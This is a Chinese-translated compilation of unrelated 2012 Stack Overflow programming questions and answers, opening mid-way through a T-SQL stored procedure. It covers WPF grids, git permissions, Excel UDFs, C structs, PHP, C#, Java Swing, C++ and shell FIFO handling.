  join CaseFiles on E.FileID = CaseFiles.FileID 
  left join CaseFileExhibitPropertyLink PL on E.ExhibitID=PL.ExhibitID 
  left join Element09a_Properties P on P.PropertyID=PL.PropertyId 
  left join ElementPropertyTypes PT on PT.PropertyTypeID=P.PropertyTypeID 
  left join ElementPropertyMakes PM on PM.PropertyMakeID=P.PropertyMakeID 
  left join ElementPropertyModels PMD on PMD.PropertyModelID=P.PropertyModelID 
  where E.ExhibitID='+convert(nvarchar,@ExhibitID);
if(@FilterQuery is not null)
begin
  select @Command+=' and '+@FilterField+ ' like '''+@FilterQuery+''' ';
end
select @Command+=' order by '+@SortName+' '+@SortOrder 
```

因此，根据存储过程，我只需要传入`exhibitID`，我就这样做了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:01:37.553

您的存储过程看起来不完整。您可能需要添加

```
exec sp_executesql @command; 
```

最后让它返回你的行。

有关 sp_executesql 的信息可以在[http://msdn.microsoft.com/en-us/library/ms188001.aspx找到](http://msdn.microsoft.com/en-us/library/ms188001.aspx)

# c# - Grid.Row 可以在删除 RowDefinition 时自动重新调整吗？

> ID：12587651
> 
> 赞同：0
> 
> 时间：2012-09-25T16:57:07.743
> 
> 标签：c#, wpf, grid

我正在以编程方式操作 WPF 网格。我有一个动态添加 RowDefinition 的按钮，并且其中一个网格列包含一个用于删除网格中任何 RowDefinition 的按钮。

当我单击“删除”按钮时，我执行：

```
//Logic to remove all Cell contents first fort this Row
// ...
//Then Remove my RowDefinition
myGrid.RowDefinitions.Remove(MyRowDefinition); 
```

效果很好，我遇到的问题是其余控件的 Grid.Row AttachedProperty 没有自动重新调整。

有没有办法做到这一点？

所以如果我有一个：

```
<Label Name="lbl1" Grid.Row="0"/>
<Label Name="lbl2" Grid.Row="1"/>
<Label Name="lbl3" Grid.Row="2"/> 
```

我删除了我希望最终得到的第二个 RowDefinition：

```
 <Label Name="lbl1" Grid.Row="0"/>
    <Label Name="lbl3" Grid.Row="1"/> 
```

不是我得到的：

```
 <Label Name="lbl1" Grid.Row="0"/>
    <Label Name="lbl3" Grid.Row="2"/> 
```

但这种情况并非如此。如果没有自动的方法来做到这一点，那么我将不得不自己编写代码。

请指教..

这是我的应用程序的外观： ![表单设计器](../Images/f3b156d957e7aebf5cbc469ad99acc13.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T17:10:24.077

您需要添加代码来自己处理。除非，您不使用网格，而是使用 ListBox，其 ListBoxItem 模板是 3 列和 1 行的网格。一列是红色拖动区域，另一列是蓝色拖动区域，第三列是按钮。您只需要一行，因为每个 ListBox 项目现在将代表一个网格行。

您必须做的第一件事是确保在上面显示的网格中存储数据的集合是 ObservableCollection。然后将其绑定到 ListBox 的 ItemsSource。我不确定您的数据是什么样的，因此请确保您正确处理所有绑定（如果有的话）。

将处理程序添加到按钮的 PreviewMouseUp。使用 PreviewMouseUp 允许 ListBox 在处理按钮的 PreviewMouseUp 之前更改 SelectedItem。然后，让相应的处理程序从绑定到 ListBox 的集合中删除 ListBox.SelectedItem。

由于被更改的集合是绑定到 ItemsSource 的 ObservableCollection，因此将通知 ListBox 更新其绑定并为您处理所有删除操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:25:39.500

这是我手动解决的方法：

```
 myGrid.RowDefinitions.Remove(MyRowDefinition);
            myGrid.ReadjustRows(RemovedRowIndex); 
```

我创建了几个扩展方法：

```
 public static  List<UIElement> GetGridCellChildren(this Grid grid, int row, int col)
    {
        return grid.Children.Cast<UIElement>().Where(
                            x => Grid.GetRow(x) == row && Grid.GetColumn(x) == col).ToList();
    }

    public static void ReadjustRows(this Grid myGrid, int row)
    {
        if (row < myGrid.RowDefinitions.Count)
        {
            for (int i = row + 1; i <= myGrid.RowDefinitions.Count; i++)
            {
                for (int j = 0; j < myGrid.ColumnDefinitions.Count; j++)
                {
                    List<UIElement> children = myGrid.GetGridCellChildren(i, j);
                    foreach(UIElement uie in children)
                    {
                        Grid.SetRow(uie,i - 1);
                    }
                }
            }
        }
    } 
```

如果有人需要它，这里是我的扩展方法来删除给定网格单元的所有内容：

```
 public static void RemoveGridCellChildren(this Grid grid, int row, int col)
    {
        List<UIElement> GridCellChildren = GetGridCellChildren(grid, row, col);
        if (GridCellChildren != null && GridCellChildren.Count > 0)
        {
            foreach (UIElement uie in GridCellChildren)
            {
                grid.Children.Remove(uie);
            }
        }
    } 
```

# wordpress - 如何配置 git 以创建具有正确权限的文件？

> ID：12587656
> 
> 赞同：1
> 
> 时间：2012-09-25T16:57:30.993
> 
> 标签：wordpress, git, file-permissions

我有一个 git repo，其中包括 wordpress 的子模块和 wordpress 主题。我正在尝试对此进行配置，以便每当有更改时我都可以在服务器上运行“git pull”，以更新存储库中的文件。我遇到的问题是，在我执行 git pull 之后，我最终在前端出现 500 错误，并且我的服务器日志显示“文件可按组写入”。基本上，我需要所有文件都具有“0755”的权限，并在我用 git 更新它们后保持这种状态。如何正确设置？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:12:41.003

查看 上的文档`filemode`。在 .git/ 下的存储库中，配置文件有一个以 [core] 开头的部分。如果您将 filemode 设置为 FALSE（或零，我不太记得了），它将阻止 git 更改任何文件的权限。然后，您可以将它们更新为正确的权限，而不要理会它们。

`git`请注意，如果您以单独的用户身份运行，您可能会遇到其他权限错误（我们`git`对运行自动更新的用户执行此操作）。只是在设置时需要注意的事情。

# iphone - GData Objective c 客户端已弃用

> ID：12587658
> 
> 赞同：0
> 
> 时间：2012-09-25T16:57:35.113
> 
> 标签：iphone, ios, xcode, youtube-api, gdata-api

在[链接](http://code.google.com/p/gdata-objectivec-client/downloads/list?can=1&q=gdata&colspec=Filename%20Summary%20Uploaded%20ReleaseDate%20Size%20DownloadCount)上提到目标 c 的 gdata 客户端已被弃用。有谁知道将视频上传到 youtube 的替代方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:47:04.777

链接指向下载现成的 zip。这些 zip 文件已弃用

源已更新。最后一次提交是从 8 月 6 日开始：[查看更改](http://code.google.com/p/gdata-objectivec-client/source/list)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:49:48.957

GData 库没有被弃用，只有下载页面上列出的旧版本被弃用。

正如第一次下载的摘要所说：

> 访问 Source Checkout 页面并使用所示的 svn 命令

单击页面顶部的“源”选项卡，您将找到最新版本，自他们提供的上次下载 (1.12.0) 以来，该版本有很多变化

# excel - Excel公式：对于列中的每个值实例，获取同一行中另一列的值

> ID：12587665
> 
> 赞同：2
> 
> 时间：2012-09-25T16:57:58.477
> 
> 标签：excel

我希望在 Excel 中解决以下问题：

```
ID     Key     Value
1      10      20
2       5      30
3      10      20
4      10      20 
```

如果 key == 10 且 Value == 20，则获取 ID。

所以，我需要这个来产生以下列表：“1,3,4”

本质上，我正在查看一个值是否在给定范围内，而另一个值在另一个范围内，给我另一个范围内的相应值（同一行）。

我不能假设 ID 列总是最左边的列。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:42:45.217

您可以为此目的使用附加的用户定义函数。从您的工作表中调用它，如下所示：

=concatPlusIfs(A1:A4,",",1,10,2,20)

在哪里

*   A1:A4 是 ID 列表
*   "," 是分隔符
*   1 是您的 id 列和您的键列之间的偏移量（-1 表示左侧的 1 列）
*   10 是您的 Key 的标准
*   2 是您的 id 列和您的 Value 列之间的偏移量
*   20 是衡量您价值的标准

    ```
    Public Function concatPlusIfs(rng As Range, sep As String, lgCritOffset1 As Long, varCrit1 As Variant, lgCritOffset2 As Long, varCrit2 As Variant, Optional noDup As Boolean = False, Optional skipEmpty As Boolean = False) As String

    Dim cl As Range, strTemp As String

    If noDup Then 'remove duplicates, use collection to avoid them

    Dim newCol As New Collection

    On Error Resume Next

    For Each cl In rng.Cells
        If skipEmpty = False Or Len(Trim(cl.Text)) > 0 Then
            If cl.Offset(, lgCritOffset1) = varCrit1 And cl.Offset(, lgCritOffset2) = varCrit2 Then newCol.Add cl.Text, cl.Text
        End If
    Next

    For i = 0 To newCol.Count
        strTemp = strTemp & newCol(i) & sep
    Next

    Else

    For Each cl In rng.Cells
        If skipEmpty = False Or Len(Trim(cl.Text)) > 0 Then
            If cl.Offset(, lgCritOffset1) = varCrit1 And cl.Offset(, lgCritOffset2) = varCrit2 Then strTemp = strTemp & cl.Text & sep
        End If
    Next

    End If

    concatPlusIfs = Left(strTemp, Len(strTemp) - Len(sep))

    End Function 
    ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T18:03:40.950

我会说这是 excel 的最基本功能，但是由于您假设您无法决定如何对列进行排序的人为限制 - 那么它需要您使用 HLOOKUP 之类的东西（假设您至少可以确定您的标题）：

```
=IF(AND(HLOOKUP("Key",$A$1:$C$5,ROW(),FALSE)=10,HLOOKUP("VALUE",$A$1:$C$5,ROW(),FALSE)=20),HLOOKUP("ID",$A$1:$C$5,ROW(),FALSE),"") 
```

![HLOOKUP_EXAMPLE](../Images/1e38a5a406c3b6e566a92c38f7272893.png)

祝你好运。

**编辑/添加：**

[使用来自： http](http://www.mcgimpsey.com/excel/udfs/multicat.html) ://www.mcgimpsey.com/excel/udfs/multicat.html的 multicat 函数

例如，对表格进行排序以消除空格，然后：

```
=multicat(C2:C5,",") 
```

或者，如果排序对您来说工作量太大 - 您可以使用 mcgimpsey 函数的这个修改版本来删除空白单元格：

```
 Public Function MultiCat( _
        ByRef rRng As Excel.Range, _
        Optional ByVal sDelim As String = "") _
             As String
     Dim rCell As Range
     For Each rCell In rRng
        If rCell.Value <> "" Then
         MultiCat = MultiCat & sDelim & rCell.Text
         End If
     Next rCell
     MultiCat = Mid(MultiCat, Len(sDelim) + 1)
  End Function 
```

# c - 在 C 中初始化一个结构

> ID：12587666
> 
> 赞同：2
> 
> 时间：2012-09-25T16:58:05.853
> 
> 标签：c, struct

我想做的只是初始化一个结构的实例。结构在这里定义：

```
typedef struct Rectangle 
{
tName Name; /* name of the rectangle */
struct Rectangle * binSon[2];
int Center[2];
int Length[2]; /* distance to the boarder of the rectangle */
int Label;
}Rectangle; 
```

以及我如何初始化它如下所示：

```
Rectangle * binSon[2];
binSon[0] = NULL;
binSon[1] = NULL;

int Center[2];  
int Length[2];

Center[0] = 0;
Center[1] = 0;
Length[0] = 5;
Length[1] = 5;

Rectangle world = {"World", binSon, Center, Length, 0}; 
```

在最后一行，当我编译程序时，它会向我报告以下警告：

```
mx_cif_ds_manager.c:52:2: warning: initialization makes integer from pointer without a cast [enabled by default]
mx_cif_ds_manager.c:52:2: warning: (near initialization for 'world.Name[0]') [enabled by default]
mx_cif_ds_manager.c:52:2: warning: initialization makes integer from pointer without a cast [enabled by default]
mx_cif_ds_manager.c:52:2: warning: (near initialization for 'world.Name[1]') [enabled by default]
mx_cif_ds_manager.c:52:2: warning: initialization makes integer from pointer without a cast [enabled by default]
mx_cif_ds_manager.c:52:2: warning: (near initialization for 'world.Name[2]') [enabled by default]
mx_cif_ds_manager.c:52:2: warning: initialization makes integer from pointer without a cast [enabled by default]
mx_cif_ds_manager.c:52:2: warning: (near initialization for 'world.Name[3]') [enabled by default] 
```

不知道这段程序出了什么问题，想知道是否有人有任何想法或建议可以帮助我改进这段代码。什么是初始化结构的更温和的方法？

谢谢

======更新======

感谢您的帮助，但是如果我想使用变量来初始化结构怎么办。在这种情况下我是否必须分配内存空间？

tName 定义在这里

```
typedef char tName[MAX_NAME_LEN + 1]; 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-25T16:59:49.060

这应该有效：

```
Rectangle world = {"World", {NULL, NULL}, {0, 0}, {5, 5}, 0}; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-25T17:00:13.403

简单得多：

```
Rectangle world = { "World", { NULL, NULL }, { 0, 0 }, { 5, 5 }, 0 }; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-25T17:19:13.933

要扩展基思的答案，如果您愿意，您也可以这样做来使用您的变量。请注意，这仅在您在函数内时有效。

```
void foo(void)
{
    Rectangle world = {"World", {binSon[0], binSon[1]}, {Center[0], Center[1]}, {Length[0], Length[1]}, 0};
} 
```

# php - 删除记录而不重定向

> ID：12587670
> 
> 赞同：0
> 
> 时间：2012-09-25T16:58:09.953
> 
> 标签：php

好吧，我有两个文件，第一个（users.php）显示用户并将“删除”链接放在每个用户旁边。另一个文件（delete.php）在有人单击“删除链接”时删除记录。这是 delete.php ：

```
$user_id = $_REQUEST['id'];
$delete_query = sprintf("DELETE FROM 'tablename' WHERE id = %d", $id);
mysql_query($delete_query);
$msg = "the users has been deleted";
header("Location: http://localhost/intranet/in-admin-panel/users.php?success_message={$msg}");
exit(); 
```

我的问题是，当我对用户进行分页时，我发现自己被重定向到第一页，即使我在 page3 中删除了一个用户，例如（这从脚本中很明显）我尝试使用重定向到上一页（ $_SERVER['HTTP_REFERER'])，但是当我读到它不安全也不实用。我想知道是否有使用 php 解决此问题的方法，或者我被迫学习 ajax 来做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:02:44.720

这可以用 JQuery 轻松完成，请查看下面的简单示例：

```
 <script src="http://code.jquery.com/jquery-1.8.2.min.js" type="text/javascript">

</script>
        <script language="javascript">
$(document).ready(function () {

    function DeleteItDude() {

                var param = "id=1";
                $.ajax({
                    type: "POST",
                    url: "/delete.php",
                    data: param,
                    success: function (msg) {

                        alert(msg)
                    }
                });
}

            $("#lkDelete").click(function () {
                DeleteItDude();
            }

);

 });    
        </script>

<a href="#" id="lkDelete">Delete it Dude</a> 
```

和砰！您无需刷新页面即可删除。

如果您不熟悉，则需要使用 JQuery 框架来使用上面的代码。访问[http://jquery.com/download/](http://jquery.com/download/)获取 .js 文件

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:02:27.633

为什么不在重定向到上一页时包含索引？

```
header("Location: http://localhost/intranet/in-admin-panel/users.php?success_message={$msg}&id{id}"); 
```

您还需要使用实际页面调用 delete.php。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T17:02:28.277

您可以使用寻呼机号码生成所有删除链接，如下所示：

```
<a href="delete.php?pager=x">delete</a> 
```

其中 x 对应于您的页码。

然后在删除脚本完成后，加载 users.php 脚本，并将 pager 值设置为 (x) 中传递的值。然后您的用户脚本可以在第 x 页恢复。

# php - 升级到山狮后，PHP 错误处理消失了

> ID：12587680
> 
> 赞同：1
> 
> 时间：2012-09-25T16:58:44.170
> 
> 标签：php, error-handling, xampp, osx-mountain-lion

我最近安装了山狮，当我从 XAMPP 启动 apache 时出现错误，要求我禁用 Web 共享以使 XAMPP 工作。经过一番研究，我发现了一个命令可以打开与山狮捆绑在一起的 apache。这有效，XAMPP 的 apache 启动了。

然而，我注意到的下一件事是我不再得到错误处理。

我使用的是fuelphp，但是当我的代码出现问题时，我得到的不是错误消息，而是一个空白页，上面写着NO DATA RECEIVED :S。

例如，`;`从行尾删除 a 会导致上述与可读错误消息相反的结果。

我检查了有错误报告的框架 index.php 文件

```
error_reporting(E_ALL);
ini_set('display_errors', 1); 
```

谁能给我一步一步的解释如何让我的错误报告回来:'(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T09:34:08.590

我在 Max OS X 上也有同样的问题。这绝对是服务器配置问题，因为完全相同的代码在 Windows 和多个 Linux 环境中运行良好。

我的 Apache/PHP 是通过 XAMPP 安装在 Mac 上的。其他遇到同样问题的人，如果您也使用 XAMPP，请在评论中告诉我。我想追踪导致此问题的确切服务器配置。

现在，我有一个 hacky 解决方法：

在**fuel/core/bootstrap.php**中，将其添加到您的顶部`register_shutdown_function`

```
$last_error = error_get_last();
if (is_array($last_error) && \Fuel::$env == \Fuel::DEVELOPMENT && in_array($last_error['type'], array(4, 1, 256, 64))) {
    exit();
} 
```

奇怪的是，它是否能捕捉到错误是偶然的。所以我有时不得不刷新几次。

哦，您必须将环境设置为 DEVELOPMENT。这是为了停止在生产部署站点中泄漏错误。

**编辑:** : MAMP（撰写本文时的最新版本 2.1.2）似乎不受此问题的影响。XAMPP 1.8.1-beta1 也没有。所以你也可以尝试使用这些。

# c# - 用 DynamicObject 替换静态资源属性

> ID：12587684
> 
> 赞同：3
> 
> 时间：2012-09-25T16:58:53.180
> 
> 标签：c#, .net, localization, resources, dynamic-keyword

`Resources.designer.cs`在我们的应用程序中，文件中的静态属性有 1000 次使用。例如：

```
Resources.string_to_identify_the_resource 
```

我们也有自己的类，它可以查找资源，但也允许从其他程序集中覆盖资源。如果我们有一个客户想要重命名插件或产品，这很有用，因为我们只需放入一个 dll 并完成。此类使用如下：

```
Resources.GetString("string_to_identify_the.resource"); 
```

我们希望通过我们自己的 Resources 类查找我们所有的资源，以便可以覆盖它们，我的任务是这样做。我不喜欢遍历和重构所有代码。

我最初的想法是使用自定义 DynamicObject：

```
public class Resources
{
  public static dynamic Dynamic = new StaticResourcesDynamicObject();

  class StaticResourcesDynamicObject : DynamicObject
  {
    public override bool TryGetMember(GetMemberBinder binder, out object result)
    {
      result = GetString(binder.Name);
      return true;
    }
  }   

  // Existing code to lookup resources
  public static string GetString(string name)
  {
    ...
  }
} 
```

所以

```
Resources.string_to_identify_the_resource 
```

将被简单地重命名为：

```
Resources.Dynamic.string_to_identify_the_resource 
```

主要问题是许多资源名称包含句点 ( `.`)，因此它们与静态属性不匹配。例如`Cmd.Too_Much`有一个静态属性`Cmd_Too_Much`.

我可以尝试获取所有不同的可能性，或者其他人有解决问题的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-03-19T00:27:33.113

为此，您必须创建自定义代码生成器，因为 Visual Studio 会为您生成资源。生成的类是静态的、不可扩展的，并且与使用 Resx 的 .NET ResourceManager 非常紧密地耦合。

您可以通过创建自定义强类型资源生成器并在 Visual Studio 中替换它来更改此设置。Visual Studio 使用`ResXFileCodeGenerator`and `PublicResXFileCodeGenerator`，或者您可以创建一个独立的工具来运行项目中的所有 Resx 文件并生成自定义强类型资源类。

如果您想了解如何执行此操作，可以查看[Westwind.Globalization](https://github.com/RickStrahl/Westwind.Globalization)，其中包含一个[`StronglyTypedResources`](https://github.com/RickStrahl/Westwind.Globalization/blob/master/Westwind.Globalization/Utilities/StronglyTypedResources.cs)类，该类仅用于为数据库资源（或 Resx）创建强类型类。您可以获取该代码并对其进行修改以生成满足您需要的自定义类。

也就是说，我认为动态不是你想要的。而是可以创建 Getter，使它们实现您要执行的逻辑。例如，我喜欢确保如果找不到资源，则始终返回**某些内容 - 绝不是 null 或空白值。**因此，如果缺少资源，我会返回资源 ID，这总比没有好。

# mediaelement.js - mediaelement.js：2.9.4 未按预期工作

> ID：12587685
> 
> 赞同：1
> 
> 时间：2012-09-25T16:59:02.483
> 
> 标签：mediaelement.js

我昨晚（9/24/12）在 2.9.4 更新之前开始使用 mediaelement.js。我想出了如何根据需要使用它，并设置了一个效果很好的测试页面。然后我注意到更新，下载并安装在我的测试页面上（不幸的是没有备份 2.9.3）。现在，当我在 firefox 中测试 mp4 文件的 flash 后备时，flash 播放器显示但不播放，当我右键单击它时显示“电影未加载...”在 2.9.3 中它立即弹出并播放视频就好了。我认为这可能与新的 flashStreamer 选项有关，但目前还没有关于如何使用该选项的文档。建议？

# java - 为 JTree 中的 DefaultMutableTreeNode 分配唯一 ID？

> ID：12587688
> 
> 赞同：1
> 
> 时间：2012-09-25T16:59:12.820
> 
> 标签：java, swing, jtree, treenode

我有一个可以添加新节点的 Jtree。我需要为每个新节点分配一个唯一 ID。我正在考虑扩展 DefaultMutableTreeNode 类，但我想它没有用，或者我做错了。

那么，我该怎么做。一个例子会很好。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T17:14:58.100

我的印象是 DefaultMutableTreeNode 在不扩展它的情况下“最好”地工作，而是包装您自己的用户定义对象。那可能有一个ID。

不过，在使用您自己的类创建节点子节点时，您的方式也应该有效。调试和跟踪日志的问题：创建所有对象等。请注意，在 API 中很容易出错，并且多次为孩子创建 TreeNode-s。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:41:52.940

好的，我想通了，它可以工作:) 我扩展了 DefaultMutableTreeNode：

```
 public class MyTreeNode extends DefaultMutableTreeNode {

    public int ID;

    public void setID(int ID) {
        this.ID = ID;
    }

    public MyTreeNode(String title) {
        setUserObject(title);
    }
} 
```

# c# - 如果你从来没有打过这行代码，做点什么

> ID：12587689
> 
> 赞同：0
> 
> 时间：2012-09-25T16:59:22.283
> 
> 标签：c#

好的，假设我有一个可变的项目列表。它可以是任意数量的项目。每个项目都可以是`0,1,2,3, or 4`。所以我做了一个循环。

```
foreach(item in allitems)
{
    if (item == 0) continue;
    do stuff for items 1-4.
} 
```

假设它经过的每个项目都是 0。那么如果我想在这种情况下执行特定的代码行怎么办？当然我可以做类似的事情

```
int count = 0
foreach(item in allitems)
{
    if (item == 0) {count++; continue;}
    do stuff for items 1-4.
}
if(count == allitems.Count())
{
    do stuff
} 
```

但我总是觉得使用计数变量来做这样的事情很便宜。有没有什么我能做的事情不像把解决方案用胶带粘在一起？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T17:03:28.023

您可以使用[Enumerable.All](http://msdn.microsoft.com/en-us/library/bb548541.aspx)检查 List 中的所有项目是否满足条件。

在这种情况下，类似

```
if (allItems.All(i => i == 0) {
   //do stuff
} 
```

顺便说一句，在你的例子中，你有`(if item = 0)`，这应该是`if (item == 0)`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-25T17:08:12.203

这里不需要使用计数 - 只需保留一个标志，如果您*通过*检查，而不是*在*检查内设置该标志：

```
bool anyNonZeroItems = false;
foreach(item in allitems)
{
    if (item == 0)
    {
        continue;
    }
    anyNonZeroItems = true;
    // Whatever else
}
if (!anyNonZeroItems)
{
    // Everything was 0 (or the collection was empty)
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-25T17:03:27.933

你目前拥有的东西是完全可以接受的。我一直使用这种模式。

我建议的一件事是，`count`除非`bool`count `count == 11 and`> 1`之间实际上存在差异

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-25T17:03:29.393

这是一个很常见的问题，但您提出了一个奇怪的解决方案。为什么不直接使用布尔值来表示状态？

```
bool branchExecuted = false;
foreach(item in allitems)
{
    if (item == 0)
    {
      branchExecuted = true; 
      continue;
    }
    //do stuff for items 1-4.
}

if(!branchExecuted)
{
    //do stuff if we never hit that line
} 
```

使用它而不是 LINQ / 便利函数对列表进行操作只会花费您一个布尔值，并且您只需遍历您的列表一次。

# c++ - 当我使用 std::auto_ptr 时出现错误 LNK2019

> ID：12587691
> 
> 赞同：0
> 
> 时间：2012-09-25T16:59:31.453
> 
> 标签：c++, visual-c++, linker-errors, lnk2019

我有一个名为 FiniteStateMachine 的类，声明如下

头文件：FiniteStateMachine.h

```
class FiniteStateMachine
{
    public:
        //Constructor
        FiniteStateMachine();

        //Destructor
        ~FiniteStateMachine();
} 
```

源文件：FiniteStateMachine.cpp

```
////////////////////////////////////////////////////////////////////////
//      Constructor
////////////////////////////////////////////////////////////////////////
FiniteStateMachine::FiniteStateMachine()
:m_InitialState("")
,m_CurrentState(NULL)
,m_Running(false)
{
    RegisterBaseTypes();
}

////////////////////////////////////////////////////////////////////////
//      Destructor
////////////////////////////////////////////////////////////////////////
FiniteStateMachine::~FiniteStateMachine()
{
    if (m_Running) Stop();
    Clear();
} 
```

我有一个名为 FSM 的头文件，我在其中收集所有项目类

有限责任公司

```
class ICORE_API FiniteStateMachine; 
```

好的，我编译它，现在想在另一个库中使用这个类。

**关于链接该库的所有事情都已完成。**

在客户端类中，当我将 FiniteStateMachine 与 auto_ptr 一起使用时，出现链接器错误：

```
#include "FSM.H"

std::auto_ptr<FiniteStateMachine > fsm;

error LNK2019: unresolved external symbol "public: __thiscall IFSM::FiniteStateMachine::~FiniteStateMachine(void)" (??1FiniteStateMachine@IFSM@@QAE@XZ) referenced in function "public: void * __thiscall FSM::FiniteStateMachine::`scalar deleting destructor'(unsigned int)" (??_GFiniteStateMachine@IFSM@@QAEPAXI@Z) 
```

但是通过这样声明

```
#include FSM.h

FiniteStateMachine* fsm; 
```

一切正常，项目完全编译。

现在我想知道为什么会这样？这里有什么问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T22:09:40.637

`std::auto_ptr<>`生成代码以调用'的`FiniteStateMachine`析构函数，在您的情况下您不提供它，因为您仅通过提供前向声明来提供。

# shell - 如何终止 shell 脚本中的 cat 管道命令？

> ID：12587695
> 
> 赞同：2
> 
> 时间：2012-09-25T16:59:39.847
> 
> 标签：shell

我使用一个命令，比如 cat 一个管道文件并 grep 一些数据。一个简单的代码，例如，

```
temp=""
temp=$(cat file|grep "some data"| wc -c)
if [ $temp -gt 0 ]
then
    echo "I got data"
fi 
```

该文件是一个管道（FIFO），它将输出数据并且不会停止。如何在有限时间内终止 cat pipe 的命令？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:18:40.167

我在第 3 行将 $ 添加到临时变量：

```
if [ $temp -gt 0 ] 
```

因为您想比较 temp 值，并且在变量之前使用 $ 得到它。

关于文件“管道”，你可以执行 cat 直到你得到一个特定的字符串。我的意思是，您可以使用 cat 进行阅读并在收到例如“\n”时停止。

我会给你一个可以在终端中运行的例子：

```
cat > example_file.txt << EOF
hello
I'm a example filen
EOF 
```

cat 将从标准输入读取，直到您输入“EOF”。然后，文件的内容将是：

```
cat example_file.txt 
hello
I'm an example file 
```

因此，您可以通过这种方式读取块，例如行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T18:02:36.677

`grep|wc`是这项工作的错误工具。选择一个更好的，例如`sed`，

```
if sed -n -e '/some data/q;$q1' file; then
    ....
fi 
```

`awk`,

```
found=$(awk '/some data/{print"y";exit}' file)
if [ -n "$found" ]; then
    ....
fi 
```

或`sh`本身。

```
found=
while read line; do
    if expr "$line" : ".*some data" >/dev/null; then
        found=y
        break
    fi
done <file
if [ -n "$found" ]; then 
    ....
fi 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T01:48:29.277

只需检查`grep`自身的退出状态：

```
if grep -q "some data" file; then
    echo "I got data"
fi 
```

如果找到匹配项，则可以防止将`-q`任何内容写入标准输出。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-06-08T19:52:10.943

另一种方法是使用 shell 脚本。

```
cat <some file and conditions> &
< perform your task>

kill $(pidof cat) 
```

只要您一次运行一个“cat”实例，它就可以工作。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-10-18T10:51:23.410

您可以使用`timeout`命令，它是`coreutils`.

`man timeout`：

```
NAME
       timeout - run a command with a time limit

SYNOPSIS
       timeout [OPTION] DURATION COMMAND [ARG]...
... 
```

等待 10 秒：

```
temp=$(timeout 10 cat file|grep "some data"| wc -c)
if [ $temp -gt 0 ]
then
    echo "I got data"
fi 
```

# c++ - 常规转换不会引发运行时错误

> ID：12587704
> 
> 赞同：0
> 
> 时间：2012-09-25T17:00:02.303
> 
> 标签：c++, inheritance, casting, static-cast

如果我们看到下面的代码，fun 函数将 C 的对象转换为 B 的对象并调用 B 自己的函数。它怎么不给出段错误。我认为这会导致崩溃。我的程序没有崩溃。任何人都可以解释为什么它工作正常。

```
#include<iostream>
using namespace std;
class A{
public:
   A() {cout<<"A's Con\n"; }
   ~A() {cout<<"A's De\n"; }
};
class B :public A
{
public:
   B() {cout<<"B's Con\n"; }
   ~B() {cout<<"B's De\n"; }
   void printb(){cout<<"B print function\n";}
   void printb2(){cout<<"B print2 function\n";}
};
class C :public A
{
public:
   C() {cout<<"C's Con\n"; }
   ~C() {cout<<"C's De\n"; }
   void printc(){cout<<"C print function\n";}
};
void fun(A *ap)
{
   B *bp = (B*) ap;
   bp->printb2();
}

int main()
{
   C c;
   fun(&c);
   return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T17:13:13.920

您正在调用未定义的行为。关于未定义行为的第一条规则是*任何事情都可能发生*。您的程序可能会崩溃，或者它可能会成功运行。它可能*看起来*成功，然后在几个小时后以“不可能”的方式崩溃。它甚至可能会向您的老板发送不适当的电子邮件或擦除您的硬盘。对于随机的良性错误来说，这当然不太可能，但如果你的程序是一个网络浏览器，它肯定可以被利用来做任何攻击者可能想要的事情。

永远不要依赖未定义的行为。始终解决根本问题。使用[Valgrind](http://valgrind.org/)、[Application Verifier](http://msdn.microsoft.com/en-us/library/ms220948%28v=vs.90%29.aspx)等工具来帮助您捕获并不总是导致崩溃的细微错误。从长远来看，它将使您的软件更加可靠。

# javascript - 在 iframe 中打开 jsTree 链接

> ID：12587707
> 
> 赞同：1
> 
> 时间：2012-09-25T17:00:10.873
> 
> 标签：javascript, jstree

请原谅我缺乏js技能......

我正在使用 jsTree 为项目创建导航树，但在获取所选项目的链接以在我的“内容”iframe 中打开时遇到问题。我搜索了高低，但似乎没有任何效果。下面是我现在拥有的 js 代码，它在“导航”框架而不是“内容”框架中打开链接。

```
$(function () {
$("#navigation").jstree({
 "themes" : {
  "theme" : "default"
 },
 "plugins" : [ "themes", "html_data", "ui", "hotkeys" ]
});
$("#navigation").bind("select_node.jstree", function (e, data) {
    var href = data.rslt.obj.children("a").attr("href");
    // this will load content into a div:
    $("#link").load(href);
    // this will follow the link:
    document.location.href=href;
}); 
```

});

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:25:21.083

```
window.parent.frames['content'] 
```

可能这会有所帮助。或者那个：

```
window.top.frames['content'] 
```

取决于您的“内容”框架的父级

# c# - C# SSIS 数据流组件 - 创建自定义输入列

> ID：12587709
> 
> 赞同：3
